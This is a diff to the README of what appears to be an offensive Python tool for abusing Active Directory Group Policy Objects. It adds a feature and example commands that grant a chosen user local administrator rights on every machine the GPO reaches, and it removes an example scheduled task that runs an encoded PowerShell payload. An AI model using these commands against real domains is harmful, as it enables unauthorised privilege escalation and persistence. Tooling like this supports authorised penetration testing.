@@ -7,13 +7,15 @@ A Python implementation of GPO Abuse techniques, inspired by [SharpGPOAbuse](htt
 This tool allows you to abuse Group Policy Objects (GPOs) in Active Directory environments. It provides the following capabilities:
 
 1. Add user rights to an account in a GPO
-2. Add scheduled tasks to a GPO 
-3. Backup a GPO before modification
-4. Restore a GPO after modification
+2. Add a user to the local administrators group in a GPO
+3. Add scheduled tasks to a GPO 
+4. Backup a GPO before modification
+5. Restore a GPO after modification
 
 ## Features
 
 - **Add user rights**: Assign specific rights to a user account through GPO
+- **Add local administrator**: Add a user to the local administrators group on all affected machines
 - **Add scheduled tasks**: Create tasks in GPOs that will be executed on targeted computers/users
 - **Backup/Restore GPOs**: Safely backup a GPO's state before modification and restore it later
 
@@ -40,6 +42,14 @@ python pygpoabuse.py <domain>/<username>[:<password>] [options]
 ```
 python pygpoabuse.py domain/username:password --add-rights -gpo-id "{GUID}" -rights "SeTcbPrivilege,SeBackupPrivilege" -user-account "targetuser"
 ```
+
+### Adding Local Administrator
+
+```
+python pygpoabuse.py domain/username:password --add-local-admin -gpo-id "{GUID}" -user-account "targetuser"
+```
+
+This will add the specified user to the local administrators group on all computers where the GPO applies.
 
 ### Adding Scheduled Tasks
 
@@ -82,9 +92,9 @@ This example demonstrates a complete workflow for safely abusing a GPO:
 python pygpoabuse.py domain/admin:password --backup-gpo -gpo-id "{GUID}"
 ```
 
-2. Add a scheduled task to the GPO:
+2. Add a user as local administrator:
 ```
-python pygpoabuse.py domain/admin:password --add-task -gpo-id "{GUID}" -taskname "Update" -command "powershell.exe -encodedcommand {BASE64}" -powershell
+python pygpoabuse.py domain/admin:password --add-local-admin -gpo-id "{GUID}" -user-account "hacker"
 ```
 
 3. After completing your operations, restore the GPO:
